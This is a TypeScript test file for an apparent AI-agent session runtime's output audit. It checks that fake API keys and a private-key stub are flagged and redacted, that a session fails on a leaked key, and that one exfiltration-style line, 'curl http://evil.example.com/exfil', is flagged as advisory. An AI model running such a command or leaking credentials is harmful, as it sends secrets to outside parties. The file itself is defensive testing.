import { mkdtemp, rm, writeFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { Config } from '../config.js';
import { CostTracker } from './cost.js';
import { DEFAULT_POLICY } from './containment-hooks.js';
import { __clearGovernanceCacheForTests } from './governance-context.js';
import { SessionError } from './session-error.js';
import { auditSessionOutput } from './audit.js';
import { SessionRuntime } from './runtime.js';

const mockSpawn = vi.hoisted(() => vi.fn());
const mockCaptureScopeBaseCommit = vi.hoisted(() =>
  vi.fn().mockResolvedValue('base-sha'),
);
const mockAuditScope = vi.hoisted(() =>
  vi.fn().mockResolvedValue({ ok: true, value: undefined }),
);

vi.mock('./adapters/index.js', () => ({
  createAdapter: vi.fn(() => ({
    spawn: mockSpawn,
  })),
  createProviderAdapter: vi.fn(),
}));

vi.mock('./scope-audit.js', () => ({
  captureScopeBaseCommit: mockCaptureScopeBaseCommit,
  auditScope: mockAuditScope,
}));

vi.mock('./plugin-loader.js', () => ({
  readPluginsForContext: vi.fn().mockResolvedValue([]),
}));

type AuditViolation = {
  severity: 'advisory' | 'fatal';
  message?: string;
  match?: string;
  redactedMatch?: string;
};

const testConfig = {
  adapter: 'cli',
  dailyBudget: 50,
  perRunBudget: 10,
  governance: {
    documentPath: 'FACTORY_RULES.md',
    maxPrLinesChanged: 900,
  },
} as Config;

describe('phase 0 gate G4: credential-leak audit floor', () => {
  let governanceDir: string;
  const originalCwd = process.cwd();

  beforeEach(async () => {
    governanceDir = await mkdtemp(join(tmpdir(), 'phase0-credential-floor-'));
    process.chdir(governanceDir);
    await writeFile(
      join(governanceDir, 'FACTORY_RULES.md'),
      '# FACTORY_RULES\n\nDaily {{dailyBudget}}\nRun {{perRunBudget}}\nMax {{maxPrLinesChanged}}',
    );
    __clearGovernanceCacheForTests();
    mockSpawn.mockReset();
    mockSpawn.mockResolvedValue({
      ok: true,
      value: { output: '', cost: 0.01 },
    });
    mockCaptureScopeBaseCommit.mockClear();
    mockCaptureScopeBaseCommit.mockResolvedValue('base-sha');
    mockAuditScope.mockClear();
    mockAuditScope.mockResolvedValue({ ok: true, value: undefined });
  });

  afterEach(async () => {
    process.chdir(originalCwd);
    __clearGovernanceCacheForTests();
    await rm(governanceDir, { recursive: true, force: true });
  });

  it('flags high-precision credential patterns as fatal with redacted matches only', () => {
    const anthropic = 'sk-ant-0123456789abcdef';
    const github = 'ghp_0123456789abcdefABCDEF';
    const aws = 'AKIA0123456789ABCDEF';
    const privateKey = [
      '-----BEGIN PRIVATE KEY-----',
      'MIIEvQIBADANBgkqhkiG9w0BAQEFAASC',
      '-----END PRIVATE KEY-----',
    ].join('\n');

    const result = auditSessionOutput(
      [
        `Anthropic: ${anthropic}`,
        `GitHub: ${github}`,
        `AWS: ${aws}`,
        privateKey,
      ].join('\n'),
      DEFAULT_POLICY,
    );

    expect(result.clean).toBe(false);
    const violations = result.violations as unknown as AuditViolation[];
    const fatalViolations = violations.filter((v) => v.severity === 'fatal');

    expect(fatalViolations).toHaveLength(4);
    expect(fatalViolations).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: 'fatal' }),
      ]),
    );

    const serialized = JSON.stringify(fatalViolations);
    for (const secret of [anthropic, github, aws]) {
      expect(serialized).not.toContain(secret);
      expect(serialized).toContain(secret.slice(0, 8));
      expect(serialized).toContain(String(secret.length));
    }
    expect(serialized).not.toContain(privateKey);
    expect(serialized).toContain('-----BEG');
  });

  it('keeps blocked-command evidence advisory', () => {
    const result = auditSessionOutput(
      '$ curl http://evil.example.com/exfil',
      DEFAULT_POLICY,
    );

    expect(result.clean).toBe(false);
    const violations = result.violations as unknown as AuditViolation[];

    expect(violations).toContainEqual(
      expect.objectContaining({ severity: 'advisory' }),
    );
    expect(violations).not.toContainEqual(
      expect.objectContaining({ severity: 'fatal' }),
    );
    expect(JSON.stringify(violations)).toContain("'curl'");
  });

  it('fails the runtime session on fatal credential audit violations', async () => {
    const leaked = 'sk-ant-0123456789abcdef';
    mockSpawn.mockResolvedValueOnce({
      ok: true,
      value: {
        output: `worker output accidentally printed ${leaked}`,
        cost: 0.05,
      },
    });

    const runtime = new SessionRuntime(
      testConfig,
      new CostTracker({ dailyBudget: 50, perRunBudget: 10 }),
    );

    const result = await runtime.spawnSession(
      'product-owner',
      { variables: {} },
      774,
    );

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toBeInstanceOf(SessionError);
      expect((result.error as SessionError).containmentBreach).toBe(true);
      expect(result.error.message).not.toContain(leaked);
    }
  });
});
